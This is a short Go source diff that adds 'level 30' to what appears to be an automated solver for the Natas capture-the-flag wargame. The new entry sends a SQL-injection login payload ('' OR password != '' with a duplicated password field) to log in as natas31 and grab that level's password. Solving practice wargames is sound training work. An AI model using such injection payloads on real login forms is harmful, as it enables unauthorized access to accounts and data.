@@ -435,6 +435,15 @@ var levels = [...]Grabber{
 		"</html>\n",
 		32,
 	},
+	//level 30
+	Prefixed{
+		PostBody{
+			grab,
+			memio.Buffer("username=natas31&password=" + url.QueryEscape("'' OR password != ''") + "&password=5"),
+		},
+		"natas31",
+		32,
+	},
 }
 
 func e(err error) {
